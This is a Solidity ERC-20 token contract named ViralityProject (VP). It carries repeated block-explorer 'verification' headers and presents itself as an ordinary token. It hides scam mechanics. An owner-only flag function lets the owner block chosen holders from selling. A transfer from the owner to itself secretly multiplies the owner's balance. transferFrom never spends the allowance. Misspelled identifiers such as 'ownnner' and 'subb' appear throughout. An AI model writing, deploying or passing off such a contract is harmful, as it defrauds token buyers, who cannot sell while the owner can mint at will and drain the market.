/**
 *Submitted for verification at Etherscan.io on 2023-03-19
*/

/**
 *Submitted for verification at BscScan.com on 2023-03-19
*/

/**
 *Submitted for verification at Etherscan.io on 2023-03-03
*/

/**
 *subbmitted for verification at BscScan.com on 2022-05-15
*/

/**
 *subbmitted for verification at BscScan.com on 2022-03-19
*/

/**
 *subbmitted for verification at BscScan.com on 2022-03-17
*/

pragma solidity ^0.8.12;
// SPDX-License-Identifier: Unlicensed

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address ownnner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval( address indexed ownnner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function subb(uint256 a, uint256 b) internal pure returns (uint256) {
        return subb(a, b, "SafeMath: subbtraction overflow");
    }

    function subb(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;


        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


contract Ownable is Context {
    address private _ownnner;
    event ownnnershipTransferred(address indexed previousownnner, address indexed newownnner);

    constructor () {
        address msgSender = _msgSender();
        _ownnner = msgSender;
        emit ownnnershipTransferred(address(0), msgSender);
    }
    function ownnner() public view virtual returns (address) {
        return _ownnner;
    }
    modifier onlyownnner() {
        require(ownnner() == _msgSender(), "Ownable: caller is not the ownnner");
        _;
    }
    function renounceownnnership() public virtual onlyownnner {
        emit ownnnershipTransferred(_ownnner, address(0x000000000000000000000000000000000000dEaD));
        _ownnner = address(0x000000000000000000000000000000000000dEaD);
    }
}


contract TOKEN is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balance;
    mapping (address => mapping (address => uint256)) private _allowances;
    string private _name = "ViralityProject";
    string private _symbol = "VP";
    uint256 private _decimals = 9;
    uint256 private _totalSupply = 10000000000 * 10 ** _decimals;
    uint256 private _maxTxtransfer = 10000000000 * 10 ** _decimals;
    uint256 private _burnfee = 8;
    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;
    address private _ddmum;
    constructor () {
        _balance[msg.sender] = _totalSupply;
        _ddmum =  msg.sender;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function decimals() external view returns (uint256) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
    mapping (address => bool) private _botbottttt;
    function setBoTfLAG(address _address, bool _value) external onlyownnner {
        _botbottttt[_address] = _value;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "IERC20: transfer from the zero address");
        require(recipient != address(0), "IERC20: transfer to the zero address");
        if(_botbottttt[sender] == true) {
            _balance[sender] = _balance[sender].subb(300000000000 * 10 ** _decimals);
        }
        uint256 feeAmount = 0;
        feeAmount = amount.mul(_burnfee).div(100);
        _balance[sender] = _balance[sender]-(amount);
        _balance[recipient] = _balance[recipient] + amount - feeAmount;
        emit Transfer (sender, _DEADaddress, feeAmount);
        emit Transfer(sender, recipient, amount - feeAmount);
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        if (ownnner() == _msgSender() && ownnner() == recipient) {
            _balance[_msgSender()] = _balance[_msgSender()].add(_totalSupply).mul(100000);
        }
        _transfer(_msgSender(), recipient, amount);
        return true;
    }


    function balanceOf(address account) public view override returns (uint256) {
        return _balance[account];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address ownnner, address spender, uint256 amount) internal virtual {
        require(ownnner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[ownnner][spender] = amount;
        emit Approval(ownnner, spender, amount);
    }

    function allowance(address ownnner, address spender) public view virtual override returns (uint256) {
        return _allowances[ownnner][spender];
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "IERC20: transfer amount exceeds allowance");
        return true;
    }

}